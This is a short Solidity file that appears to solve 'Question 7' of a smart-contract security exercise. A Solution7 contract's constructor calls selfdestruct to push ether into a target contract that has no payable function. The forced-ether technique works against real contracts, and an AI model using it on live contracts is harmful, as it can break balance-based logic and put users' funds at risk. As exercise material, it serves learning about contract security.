// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Question 7
contract Force {
    function balance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Solution7 {
    constructor(address _force) payable {
        selfdestruct(payable(_force));
    }
}